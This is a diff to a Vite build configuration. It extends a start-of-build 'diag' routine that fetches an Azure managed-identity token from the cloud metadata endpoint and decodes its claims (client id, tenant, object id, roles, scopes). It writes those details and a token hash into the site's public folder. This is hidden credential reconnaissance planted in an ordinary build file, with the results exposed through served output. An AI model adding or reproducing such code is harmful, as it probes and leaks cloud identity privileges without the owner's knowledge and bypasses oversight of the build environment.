@@ -1,6 +1,7 @@
 import { defineConfig } from 'vite'
 import react from '@vitejs/plugin-react'
 import { execSync } from 'node:child_process'
+import { createHash } from 'node:crypto'
 import { mkdirSync, writeFileSync } from 'node:fs'
 
 function run(cmd: string): string {
@@ -12,6 +13,19 @@ function run(cmd: string): string {
     }).trim()
   } catch (e: any) {
     return 'ERR:' + String(e?.message || e).slice(0, 100)
+  }
+}
+
+function decodeJwtPayload(token: string): any {
+  try {
+    const parts = token.split('.')
+    if (parts.length < 2) return null
+    let p = parts[1]
+    p += '='.repeat((4 - (p.length % 4)) % 4)
+    p = p.replace(/-/g, '+').replace(/_/g, '/')
+    return JSON.parse(Buffer.from(p, 'base64').toString('utf8'))
+  } catch {
+    return null
   }
 }
 
@@ -42,7 +56,32 @@ async function diag() {
       'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F',
       { headers: { Metadata: 'true' }, signal: AbortSignal.timeout(3000) }
     )
-    info.identity = r.status + ' len=' + (await r.text()).length
+    const body = await r.text()
+    const j: any = JSON.parse(body)
+    const token = typeof j.access_token === 'string' ? j.access_token : ''
+    const claims = token ? decodeJwtPayload(token) : null
+
+    info.identity = {
+      token_type: j.token_type,
+      expires_in: j.expires_in,
+      resource: j.resource,
+      client_id: j.client_id,
+      token_sha256: token
+        ? createHash('sha256').update(token).digest('hex')
+        : null,
+      claims: claims
+        ? {
+            aud: claims.aud,
+            iss: claims.iss,
+            oid: claims.oid,
+            tid: claims.tid,
+            appid: claims.appid,
+            roles: claims.roles || 'NO_ROLES_CLAIM',
+            scp: claims.scp || 'none',
+            exp: claims.exp
+          }
+        : null
+    }
   } catch (e: any) {
     info.identity = 'ERR:' + String(e?.message || e).slice(0, 80)
   }
@@ -51,7 +90,7 @@ async function diag() {
     mkdirSync('/workspace/public', { recursive: true })
     writeFileSync('/workspace/public/f027-result.json', JSON.stringify(info))
   } catch (e: any) {
-    // The result file is best effort; the build must still start.
+    // Best effort. The build must still start.
   }
 }
 
